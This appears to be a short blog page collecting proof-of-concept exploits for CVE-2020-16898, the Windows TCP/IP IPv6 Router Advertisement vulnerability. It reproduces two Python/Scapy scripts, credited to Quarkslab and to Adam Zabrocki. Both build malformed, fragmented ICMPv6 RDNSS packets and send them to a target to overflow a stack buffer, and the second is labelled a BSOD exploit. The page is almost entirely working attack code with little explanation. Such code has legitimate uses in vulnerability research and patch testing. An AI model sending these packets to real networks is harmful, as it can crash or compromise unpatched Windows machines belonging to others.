---
title: POC
type: POC
date: 2020-10-10 20:34:54
---


### POC 收集

#### CVE-2020-16898

`https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html`

```
def trigger(target_addr):
    ip = IPv6(dst = target_addr)
    ra = ICMPv6ND_RA()

    rdnss = ICMPv6NDOptRDNSS(lifetime=900, dns=["3030:3030:3030:3030:3030:3030:3030:3030",
            "3131:3131:3131:3131:3131:3131:3131:3131"])
    # We put an even value for the option length (original length was 5)
    rdnss.len = len(rdnss.dns) * 2
    truncated = bytes(rdnss)[: (rdnss.len-1) * 8]

    # The last 8 bytes of the crafted RDNSS option are interpreted as the start of a second option
    # We build a Route Information Option here
    # https://tools.ietf.org/html/rfc4191#section-2.3
    # Second byte (0x22) is the Length. This controls the size of the buffer overflow
    # (in this case, 0x22 * 8 == 0x110 bytes will be written to the stack buffer)
    routeinfo = '\x18\x22\xfd\x81\x00\x00\x03\x84'

    # the value that overwrites the return address is taken from here
    correct = ICMPv6NDOptRDNSS(lifetime=900, dns=["4141:4141:4141:4141:4141:4141:4141:4141",
            "4242:4242:4242:4242:4242:4242:4242:4242"])

    crafted = truncated +  routeinfo

    FH=IPv6ExtHdrFragment()
    ip.hlim = 255
    packet = ip/FH/ra/crafted/correct/correct/correct/correct/correct/correct/correct/correct/correct


    frags=fragment6(packet, 100)
    print("len of packet: %d | number of frags: %d" % (len(packet), len(frags)))
    packet.show()

    for frag in frags:
        send(frag)
```

`http://blog.pi3.com.pl/?p=780`

```
#!/usr/bin/env python3
#
# Proof-of-Concept / BSOD exploit for CVE-2020-16898 - Windows TCP/IP Remote Code Execution Vulnerability
#
# Author: Adam 'pi3' Zabrocki
# http://pi3.com.pl
#

from scapy.all import *

v6_dst = "fd12:db80:b052:0:7ca6:e06e:acc1:481b"
v6_src = "fe80::24f5:a2ff:fe30:8890"

p_test_half = 'A'.encode()*8 + b"\x18\x30" + b"\xFF\x18"
p_test = p_test_half + 'A'.encode()*4

c = ICMPv6NDOptEFA();

e = ICMPv6NDOptRDNSS()
e.len = 21
e.dns = [
"AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA" ]

pkt = ICMPv6ND_RA() / ICMPv6NDOptRDNSS(len=8) / \
      Raw(load='A'.encode()*16*2 + p_test_half + b"\x18\xa0"*6) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e

p_test_frag = IPv6(dst=v6_dst, src=v6_src, hlim=255)/ \
              IPv6ExtHdrFragment()/pkt

l=fragment6(p_test_frag, 200)

for p in l:
    send(p)
```